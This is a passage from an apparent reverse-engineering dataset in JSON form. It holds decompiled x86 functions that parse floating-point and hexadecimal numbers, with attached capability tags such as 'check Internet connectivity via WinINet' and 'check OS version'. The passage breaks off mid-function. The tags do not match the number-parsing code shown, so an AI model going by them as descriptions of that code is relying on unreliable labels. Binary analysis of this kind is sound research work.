        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_13h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004223d4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    int32_t arg_10h_00;\n    int32_t unaff_EBP;\n    int32_t iVar11;\n    char *pcVar12;\n    uint uVar13;\n    uchar *puVar14;\n    uchar *puVar15;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_13h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x7c);\n    iVar11 = *(unaff_EBP + 0x18);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    uVar6 = *(iVar11 + 0x14);\n    *(unaff_EBP + -0x84) = arg_10h_00;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x58) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x1c);\n    if ((uVar6 & 0x3000) == 0x3000) {\n        fcn.00422a3c(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar11, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x00422a36;\n    }\n    fcn.00421bb3(*(iVar11 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00421aa2(unaff_EBP + -0x78);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x6c) = piVar5;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x50);\n    (*pcVar1)();\n    uVar13 = *(iVar11 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x60) = *(unaff_EBP + -0x70);\n    *(unaff_EBP + -0x54) = 0;\n    *(unaff_EBP + -0x52) = 0;\n    fcn.00421bb3(uVar13);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.004218b0(unaff_EBP + -0x78);\n    *(unaff_EBP + -4) = 1;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x1c);\n    (**0x4742a4)(0x4744c4, 0x4744d3, unaff_EBP + -0x20);\n    (*pcVar1)();\n    uVar13 = *(unaff_EBP + -0x58);\n    cVar2 = fcn.00424ec3(uVar13);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        cVar2 = *(arg_10h_00 + 5);\n        if (cVar2 == *(unaff_EBP + -0x15)) {\n            puVar14 = *(unaff_EBP + -0x70);\n            *puVar14 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00423d04();\n                cVar2 = *(arg_10h_00 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x00422512;\n            puVar14 = *(unaff_EBP + -0x70);\n            *puVar14 = 0x2d;\n        }\n        puVar14 = puVar14 + 1;\n        fcn.004234d8();\n    }\n    else {\ncode_r0x00422512:\n        puVar14 = *(unaff_EBP + -0x60);\n    }\n    piVar5 = *(unaff_EBP + -0x88);\n    *puVar14 = 0x30;\n    *(unaff_EBP + -0x80) = puVar14;\n    puVar14 = puVar14 + 1;\n    *(unaff_EBP + -0x60) = puVar14;\n    iVar11 = *piVar5;\n    *(unaff_EBP + -0x51) = 0;\n    *(unaff_EBP + -100) = 0;\n    *(unaff_EBP + -0x5c) = 0;\n    *(unaff_EBP + -0x7c) = ((iVar11 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x50;\n    *(unaff_EBP + -0x68) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x3c)) {\n        pcVar12 = *(unaff_EBP + -0x50);\n        *(unaff_EBP + -0x68) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar2 = fcn.00424ec3(uVar13);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                uVar6 = fcn.00421578(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n                if (9 < uVar6) break;\n                iVar11 = *(unaff_EBP + -100);\n                if (*(unaff_EBP + -0x7c) == iVar11 || *(unaff_EBP + -0x7c) < iVar11) {\n                    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n                    if (uVar6 != 0) {\n                        *(unaff_EBP + -0x52) = 1;\n                    }\n                }\n                else if ((uVar6 != 0) || (iVar11 != 0)) {\n                    *puVar14 = *(uVar6 + 0x4744c4);\n                    puVar14 = puVar14 + 1;\n                    *(unaff_EBP + -100) = iVar11 + 1;\n                }\n                *(unaff_EBP + -0x51) = 1;\n                fcn.004234d8();\n                cVar2 = fcn.00424ec3(uVar13);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x60) = puVar14;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x40) == 0) {\n            *(unaff_EBP + -0x53) = 0;\n        }\n        else {\n            pcVar1 = *(**(unaff_EBP + -0x6c) + 0x10);\n            (**0x4742a4)();\n            uVar3 = (*pcVar1)();\n            *(unaff_EBP + -0x53) = uVar3;\n        }\n        *(unaff_EBP + -0x28) = 0;\n        *(unaff_EBP + -0x24) = 0xf;\n        *(unaff_EBP + -0x38) = 0;\n        fcn.0040acd0(1, 0);\n        *(unaff_EBP + -4) = 3;\n        iVar11 = 0;\n        uVar6 = fcn.00424ec3(*(unaff_EBP + -0x58));\n        if (uVar6 != '\\0') {\n            pcVar12 = *(unaff_EBP + -0x38);\ncode_r0x004226b2:\n            do {\n                pcVar8 = *(unaff_EBP + -0x68);\n                while( true ) {\n                    if ((iVar11 == 0) || (cVar2 = *pcVar8,  cVar2 == '\\x7f')) goto code_r0x004226fa;\n                    iVar11 = iVar11 + -1;\n                    if (iVar11 != 0) {\n                        pcVar8 = unaff_EBP + -0x38;\n                        if (0xf < *(unaff_EBP + -0x24)) {\n                            pcVar8 = pcVar12;\n                        }\n                        if (cVar2 != pcVar8[iVar11]) goto code_r0x004226f6;\n                    }\n                    if (iVar11 == 0) {\n                        pcVar8 = unaff_EBP + -0x38;\n                        if (0xf < *(unaff_EBP + -0x24)) {\n                            pcVar8 = pcVar12;\n                        }\n                        if (cVar2 < *pcVar8) goto code_r0x004226f6;\n                    }\n                    pcVar8 = *(unaff_EBP + -0x68) + 1;\n                    if (*pcVar8 < '\\x01') break;\n                    *(unaff_EBP + -0x68) = pcVar8;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                uVar6 = fcn.00423d04();\n            }\n            uVar6 = uVar6 & 0xffffff00 | *(arg_10h_00 + 5);\n            *(unaff_EBP + -0x74) = uVar6;\n            uVar6 = fcn.00421578(unaff_EBP + -0x20, uVar6);\n            if (uVar6 < 10) {\n                iVar7 = *(unaff_EBP + -100);\n                *(unaff_EBP + -0x51) = 1;\n                if (*(unaff_EBP + -0x7c) == iVar7 || *(unaff_EBP + -0x7c) < iVar7) {\n                    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n                    if (uVar6 != 0) {\n                        *(unaff_EBP + -0x52) = 1;\n                    }\n                }\n                else if ((uVar6 != 0) || (iVar7 != 0)) {\n                    *puVar14 = *(uVar6 + 0x4744c4);\n                    puVar14 = puVar14 + 1;\n                    *(unaff_EBP + -0x60) = puVar14;\n                    *(unaff_EBP + -100) = iVar7 + 1;\n                }\n                iVar7 = unaff_EBP + -0x38;\n                if (0xf < *(unaff_EBP + -0x24)) {\n                    iVar7 = *(unaff_EBP + -0x38);\n                }\n                if (*(iVar7 + iVar11) != '\\x7f') {\n                    iVar7 = unaff_EBP + -0x38;\n                    if (0xf < *(unaff_EBP + -0x24)) {\n                        iVar7 = *(unaff_EBP + -0x38);\n                    }\n                    *(iVar7 + iVar11) = *(iVar7 + iVar11) + '\\x01';\n                }\n            }\n            else {\n                pcVar12 = *(unaff_EBP + -0x38);\n                pcVar8 = unaff_EBP + -0x38;\n                if (0xf < *(unaff_EBP + -0x24)) {\n                    pcVar8 = pcVar12;\n                }\n                if ((pcVar8[iVar11] == '\\0') || (*(unaff_EBP + -0x53) == '\\0')) goto code_r0x00422697;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00423d04();\n                    cVar2 = *(arg_10h_00 + 5);\n                    pcVar12 = *(unaff_EBP + -0x38);\n                }\n                else {\n                    cVar2 = *(unaff_EBP + -0x74);\n                }\n                if (cVar2 != *(unaff_EBP + -0x53)) goto code_r0x00422697;\n                fcn.00406de0(1, 0);\n                iVar11 = iVar11 + 1;\n            }\n            fcn.004234d8();\n            uVar6 = fcn.00424ec3(*(unaff_EBP + -0x58));\n        } while (uVar6 == '\\0');\n        pcVar12 = *(unaff_EBP + -0x38);\ncode_r0x00422697:\n        if (iVar11 == 0) goto code_r0x004226b2;\n        pcVar8 = unaff_EBP + -0x38;\n        if (0xf < *(unaff_EBP + -0x24)) {\n            pcVar8 = pcVar12;\n        }\n        if ('\\0' < pcVar8[iVar11]) {\n            iVar11 = iVar11 + 1;\n            goto code_r0x004226b2;\n        }\ncode_r0x004226f6:\n        *(unaff_EBP + -0x54) = 1;\ncode_r0x004226fa:\n        *(unaff_EBP + -4) = 1;\n        fcn.00406810();\n        uVar13 = *(unaff_EBP + -0x58);\n    }\n    cVar2 = fcn.00424ec3(uVar13);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        cVar2 = *(arg_10h_00 + 5);\n        pcVar1 = *(**(unaff_EBP + -0x6c) + 0xc);\n        (**0x4742a4)();\n        cVar4 = (*pcVar1)();\n        if (cVar2 == cVar4) {\n            puVar9 = fcn.0045b6c6();\n            arg_10h_00 = *(unaff_EBP + -0x84);\n            *puVar14 = **puVar9;\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x60) = puVar14;\n            fcn.004234d8();\n        }\n        else {\n            arg_10h_00 = *(unaff_EBP + -0x84);\n        }\n        uVar13 = *(unaff_EBP + -0x58);\n    }\n    if ((**(unaff_EBP + -0x88) != 1000000000) && (*(unaff_EBP + -100) == 0)) {\n        cVar2 = fcn.00424ec3(uVar13);\n        if (cVar2 == '\\0') {\n            iVar11 = *(unaff_EBP + -0x5c);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                if (*(arg_10h_00 + 5) != *(unaff_EBP + -0x20)) break;\n                *(unaff_EBP + -0x51) = 1;\n                iVar11 = iVar11 + -1;\n                fcn.004234d8();\n                cVar2 = fcn.00424ec3(uVar13);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x5c) = iVar11;\n            puVar14 = *(unaff_EBP + -0x60);\n        }\n        iVar11 = *(unaff_EBP + -0x5c);\n        if (iVar11 < 0) {\n            *puVar14 = 0x30;\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x5c) = iVar11 + 1;\n        }\n    }\n    while (cVar2 = fcn.00424ec3(uVar13),  cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        uVar6 = fcn.00421578(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n        if (9 < uVar6) break;\n        iVar11 = *(unaff_EBP + -100);\n        if (iVar11 < *(unaff_EBP + -0x7c)) {\n            *puVar14 = *(uVar6 + 0x4744c4);\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -100) = iVar11 + 1;\n        }\n        else if (uVar6 != 0) {\n            *(unaff_EBP + -0x52) = 1;\n        }\n        *(unaff_EBP + -0x51) = 1;\n        fcn.004234d8();\n    }\n    if (*(unaff_EBP + -0x52) != '\\0') {\n        pcVar12 = puVar14 + -1;\n        if (pcVar12 == *(unaff_EBP + -0x80)) {\ncode_r0x004228d7:\n            *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n            *pcVar12 = '1';\n        }\n        else {\n            do {\n                ppcVar10 = fcn.0045b6c6();\n                cVar2 = *pcVar12;\n                if (cVar2 != **ppcVar10) {\n                    if (cVar2 != '9') {\n                        pcVar8 = *(unaff_EBP + -0x80);\n                        *pcVar12 = cVar2 + '\\x01';\n                        break;\n                    }\n                    *pcVar12 = '0';\n                }\n                pcVar8 = *(unaff_EBP + -0x80);\n                pcVar12 = pcVar12 + -1;\n            } while (pcVar12 != pcVar8);\n            if (pcVar12 == pcVar8) goto code_r0x004228d7;\n        }\n        uVar13 = *(unaff_EBP + -0x58);\n    }\n    cVar2 = *(unaff_EBP + -0x51);\n    puVar15 = puVar14;\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00424ec3(uVar13);\n        if (cVar2 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00423d04();\n            }\n            cVar2 = *(arg_10h_00 + 5);\n            if (cVar2 != *(unaff_EBP + -0x13)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00423d04();\n                    cVar2 = *(arg_10h_00 + 5);\n                }\n                if (cVar2 != *(unaff_EBP + -0x14)) goto code_r0x00422a18;\n            }\n            *puVar14 = 0x65;\n            puVar15 = puVar14 + 1;\n            fcn.004234d8();\n            iVar11 = 0;\n            *(unaff_EBP + -0x51) = 0;\n            *(unaff_EBP + -0x74) = 0;\n            cVar2 = fcn.00424ec3(*(unaff_EBP + -0x58));\n            if (cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                cVar2 = *(arg_10h_00 + 5);\n                if (cVar2 == *(unaff_EBP + -0x15)) {\n                    *puVar15 = 0x2b;\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00423d04();\n                        cVar2 = *(arg_10h_00 + 5);\n                    }\n                    if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x00422983;\n                    *puVar15 = 0x2d;\n                }\n                puVar15 = puVar14 + 2;\n                fcn.004234d8();\n            }\ncode_r0x00422983:\n            cVar2 = fcn.00424ec3(*(unaff_EBP + -0x58));\n            if (cVar2 == '\\0') {\n                uVar13 = *(unaff_EBP + -0x58);\n                do {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00423d04();\n                    }\n                    if (*(arg_10h_00 + 5) != *(unaff_EBP + -0x20)) break;\n                    *(unaff_EBP + -0x51) = 1;\n                    fcn.004234d8();\n                    cVar2 = fcn.00424ec3(uVar13);\n                } while (cVar2 == '\\0');\n                iVar11 = *(unaff_EBP + -0x74);\n                if (*(unaff_EBP + -0x51) != '\\0') {\n                    *puVar15 = 0x30;\n                    puVar15 = puVar15 + 1;\n                }\n            }\n            while (cVar2 = fcn.00424ec3(*(unaff_EBP + -0x58)),  cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                uVar6 = fcn.00421578(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n                if (9 < uVar6) break;\n                if (iVar11 < 8) {\n                    *puVar15 = *(uVar6 + 0x4744c4);\n                    puVar15 = puVar15 + 1;\n                    iVar11 = iVar11 + 1;\n                }\n                *(unaff_EBP + -0x51) = 1;\n                fcn.004234d8();\n            }\n        }\ncode_r0x00422a18:\n        cVar2 = *(unaff_EBP + -0x51);\n    }\n    if ((*(unaff_EBP + -0x54) != '\\0') || (cVar2 == '\\0')) {\n        puVar15 = *(unaff_EBP + -0x70);\n    }\n    *puVar15 = 0;\n    fcn.00406810();\ncode_r0x00422a36:\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 5472
    },
    "00422a3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_15h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid __cdecl fcn.00422a3c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    int32_t unaff_EBP;\n    int32_t iVar12;\n    uint uVar13;\n    ushort *puVar14;\n    ushort *puVar15;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_15h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x88);\n    iVar12 = *(unaff_EBP + 0x18);\n    iVar11 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0xc);\n    uVar13 = *(iVar12 + 0x30);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x7c) = iVar11;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x1c);\n    fcn.00421bb3(uVar13);\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00421aa2(unaff_EBP + -0x78);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x84) = piVar5;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x60);\n    (*pcVar1)();\n    uVar13 = *(iVar12 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.00421bb3(uVar13);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.004218b0(unaff_EBP + -0x78);\n    *(unaff_EBP + -4) = 1;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x1c);\n    (**0x4742a4)(0x4744f0, 0x47450d, unaff_EBP + -0x30);\n    (*pcVar1)();\n    uVar13 = *(unaff_EBP + -0x68);\n    puVar14 = *(unaff_EBP + -0x8c);\n    *(unaff_EBP + -99) = 0;\n    cVar2 = fcn.00424ec3(uVar13);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        cVar2 = *(iVar11 + 5);\n        if (cVar2 == *(unaff_EBP + -0x19)) {\n            *puVar14 = 0x2b;\n        }\n        else {\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.00423d04();\n                cVar2 = *(iVar11 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x1a)) goto code_r0x00422b57;\n            *puVar14 = 0x2d;\n        }\n        puVar14 = puVar14 + 1;\n        fcn.004234d8();\n    }\ncode_r0x00422b57:\n    *puVar14 = 0x7830;\n    puVar14 = puVar14 + 1;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x88) = puVar14;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x6c) = 0;\n    cVar2 = fcn.00424ec3(uVar13);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        if (*(iVar11 + 5) == *(unaff_EBP + -0x30)) {\n            fcn.004234d8();\n            cVar2 = fcn.00424ec3(uVar13);\n            if (cVar2 == '\\0') {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                cVar2 = *(iVar11 + 5);\n                if (cVar2 != *(unaff_EBP + -0x17)) {\n                    if (*(iVar11 + 4) == '\\0') {\n                        fcn.00423d04();\n                        cVar2 = *(iVar11 + 5);\n                    }\n                    if (cVar2 != *(unaff_EBP + -0x18)) goto code_r0x00422bd5;\n                }\n                fcn.004234d8();\n            }\n            else {\ncode_r0x00422bd5:\n                *(unaff_EBP + -0x61) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0x90) = ((**(unaff_EBP + -0x94) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar10 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x80) = pcVar10;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar10 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x80) = pcVar10;\n    }\n    if ((*pcVar10 == '\\x7f') || (*pcVar10 < '\\x01')) {\n        cVar2 = fcn.00424ec3(uVar13);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                uVar6 = fcn.00421578(unaff_EBP + -0x30, *(iVar11 + 5));\n                if (0x15 < uVar6) break;\n                iVar12 = *(unaff_EBP + -0x70);\n                if (*(unaff_EBP + -0x90) == iVar12 || *(unaff_EBP + -0x90) < iVar12) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                }\n                else if ((uVar6 != 0) || (iVar12 != 0)) {\n                    *puVar14 = *(uVar6 + 0x4744f0);\n                    puVar14 = puVar14 + 1;\n                    *(unaff_EBP + -0x70) = iVar12 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004234d8();\n                cVar2 = fcn.00424ec3(uVar13);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x88) = puVar14;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x62) = 0;\n        }\n        else {\n            pcVar1 = *(**(unaff_EBP + -0x84) + 0x10);\n            (**0x4742a4)();\n            uVar3 = (*pcVar1)();\n            *(unaff_EBP + -0x62) = uVar3;\n        }\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        fcn.0040acd0(1, 0);\n        *(unaff_EBP + -4) = 3;\n        iVar12 = 0;\n        uVar6 = fcn.00424ec3(*(unaff_EBP + -0x68));\n        if (uVar6 != '\\0') {\n            uVar6 = *(unaff_EBP + -0x34);\n            iVar7 = *(unaff_EBP + -0x48);\ncode_r0x00422d75:\n            do {\n                pcVar10 = *(unaff_EBP + -0x80);\n                while( true ) {\n                    if ((iVar12 == 0) || (cVar2 = *pcVar10,  cVar2 == '\\x7f')) goto code_r0x00422dcf;\n                    iVar12 = iVar12 + -1;\n                    if (iVar12 != 0) {\n                        *(unaff_EBP + -0x74) = unaff_EBP + -0x48;\n                        if (0xf < uVar6) {\n                            *(unaff_EBP + -0x74) = iVar7;\n                        }\n                        iVar11 = *(unaff_EBP + -0x7c);\n                        if (cVar2 != *(*(unaff_EBP + -0x74) + iVar12)) goto code_r0x00422dcb;\n                    }\n                    if (iVar12 == 0) {\n                        *(unaff_EBP + -0x74) = unaff_EBP + -0x48;\n                        if (0xf < uVar6) {\n                            *(unaff_EBP + -0x74) = iVar7;\n                        }\n                        iVar11 = *(unaff_EBP + -0x7c);\n                        if (cVar2 < **(unaff_EBP + -0x74)) goto code_r0x00422dcb;\n                    }\n                    pcVar10 = *(unaff_EBP + -0x80) + 1;\n                    if (*pcVar10 < '\\x01') break;\n                    *(unaff_EBP + -0x80) = pcVar10;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar11 + 4) == '\\0') {\n                uVar6 = fcn.00423d04();\n            }\n            uVar6 = uVar6 & 0xffffff00 | *(iVar11 + 5);\n            *(unaff_EBP + -0x74) = uVar6;\n            uVar6 = fcn.00421578(unaff_EBP + -0x30, uVar6);\n            if (uVar6 < 0x16) {\n                iVar7 = *(unaff_EBP + -0x70);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x90) == iVar7 || *(unaff_EBP + -0x90) < iVar7) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                }\n                else if ((uVar6 != 0) || (iVar7 != 0)) {\n                    *puVar14 = *(uVar6 + 0x4744f0);\n                    puVar14 = puVar14 + 1;\n                    *(unaff_EBP + -0x88) = puVar14;\n                    *(unaff_EBP + -0x70) = iVar7 + 1;\n                }\n                iVar7 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar7 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar7 + iVar12) != '\\x7f') {\n                    iVar7 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar7 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar7 + iVar12) = *(iVar7 + iVar12) + '\\x01';\n                }\n            }\n            else {\n                uVar6 = *(unaff_EBP + -0x34);\n                iVar7 = *(unaff_EBP + -0x48);\n                iVar9 = unaff_EBP + -0x48;\n                if (0xf < uVar6) {\n                    iVar9 = iVar7;\n                }\n                if ((*(iVar9 + iVar12) == '\\0') || (*(unaff_EBP + -0x62) == '\\0')) goto code_r0x00422d58;\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.00423d04();\n                    cVar2 = *(iVar11 + 5);\n                    uVar6 = *(unaff_EBP + -0x34);\n                    iVar7 = *(unaff_EBP + -0x48);\n                }\n                else {\n                    cVar2 = *(unaff_EBP + -0x74);\n                }\n                if (cVar2 != *(unaff_EBP + -0x62)) goto code_r0x00422d58;\n                fcn.00406de0(1, 0);\n                iVar12 = iVar12 + 1;\n            }\n            fcn.004234d8();\n            uVar6 = fcn.00424ec3(*(unaff_EBP + -0x68));\n        } while (uVar6 == '\\0');\n        uVar6 = *(unaff_EBP + -0x34);\n        iVar7 = *(unaff_EBP + -0x48);\ncode_r0x00422d58:\n        if (iVar12 == 0) goto code_r0x00422d75;\n        iVar9 = unaff_EBP + -0x48;\n        if (0xf < uVar6) {\n            iVar9 = iVar7;\n        }\n        if ('\\0' < *(iVar9 + iVar12)) {\n            iVar12 = iVar12 + 1;\n            goto code_r0x00422d75;\n        }\ncode_r0x00422dcb:\n        *(unaff_EBP + -99) = 1;\ncode_r0x00422dcf:\n        *(unaff_EBP + -4) = 1;\n        fcn.00406810();\n        uVar13 = *(unaff_EBP + -0x68);\n    }\n    if ((*(unaff_EBP + -0x61) != '\\0') && (*(unaff_EBP + -0x70) == 0)) {\n        *puVar14 = 0x30;\n        puVar14 = puVar14 + 1;\n        *(unaff_EBP + -0x88) = puVar14;\n    }\n    cVar2 = fcn.00424ec3(uVar13);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        cVar2 = *(iVar11 + 5);\n        pcVar1 = *(**(unaff_EBP + -0x84) + 0xc);\n        (**0x4742a4)();\n        cVar4 = (*pcVar1)();\n        if (cVar2 == cVar4) {\n            puVar8 = fcn.0045b6c6();\n            iVar11 = *(unaff_EBP + -0x7c);\n            *puVar14 = **puVar8;\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x88) = puVar14;\n            fcn.004234d8();\n        }\n        else {\n            iVar11 = *(unaff_EBP + -0x7c);\n        }\n        uVar13 = *(unaff_EBP + -0x68);\n    }\n    if (*(unaff_EBP + -0x70) == 0) {\n        cVar2 = fcn.00424ec3(uVar13);\n        if (cVar2 == '\\0') {\n            iVar12 = *(unaff_EBP + -0x6c);\n            do {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                if (*(iVar11 + 5) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar12 = iVar12 + -1;\n                fcn.004234d8();\n                cVar2 = fcn.00424ec3(uVar13);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x6c) = iVar12;\n            puVar14 = *(unaff_EBP + -0x88);\n        }\n        iVar12 = *(unaff_EBP + -0x6c);\n        if (iVar12 < 0) {\n            *puVar14 = 0x30;\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x6c) = iVar12 + 1;\n        }\n    }\n    while( true ) {\n        cVar2 = fcn.00424ec3(uVar13);\n        if (cVar2 != '\\0') break;\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.00423d04();\n        }\n        uVar6 = fcn.00421578(unaff_EBP + -0x30, *(iVar11 + 5));\n        if (0x15 < uVar6) break;\n        iVar12 = *(unaff_EBP + -0x70);\n        if (iVar12 < *(unaff_EBP + -0x90)) {\n            *puVar14 = *(uVar6 + 0x4744f0);\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x70) = iVar12 + 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.004234d8();\n    }\n    cVar2 = *(unaff_EBP + -0x61);\n    puVar15 = puVar14;\n    if (cVar2 == '\\0') goto code_r0x004230b0;\n    cVar2 = fcn.00424ec3(uVar13);\n    if (cVar2 == '\\0') {\n        if 